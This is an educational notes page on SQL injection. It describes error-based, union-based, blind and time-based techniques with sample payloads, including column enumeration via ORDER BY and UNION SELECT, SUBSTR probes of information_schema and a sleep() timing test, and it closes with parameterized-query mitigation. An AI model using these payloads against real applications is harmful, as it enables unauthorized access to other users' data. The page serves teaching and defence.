---
description: All kinds and forms of SQLi for discussion and questioning
---

# SQL Injection (SQLi)

SQL Injection is a form of database attack to query/modify data from the database. Attackers can obtain results that may belong to other users. SQLi can be extended to compromise backend server or cause denial of service.



{% embed url="https://portswigger.net/web-security/sql-injection" %}
Fantastic Explanation By PortSwigger
{% endembed %}



### Attack Types

* Error Based

Cannot see query output but can see errors, make use of errors to formulate exploit

```bash
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```

* Union Based

Commonly using Order By / Group By with Union

```bash
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```

* Blind Based

No output or errors but contents on webpage may differ depending if query is **true or false**

```basic
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```

* Timed Based

Test if query response takes longer than normal to load the content

```bash
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```



### Mitigation

#### Parameterized Query

By using a prepared statement rather than concatenation of strings, SQLi will be greatly reduced to prevent possible attacks from untrusted user input

```basic
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

A step further in using prepared statement would be to use stored procedures that hold fully prepared statements within the database to query itself without the need of user input

## Author

- [Zheng Jie](https://github.com/Bread7) 🍞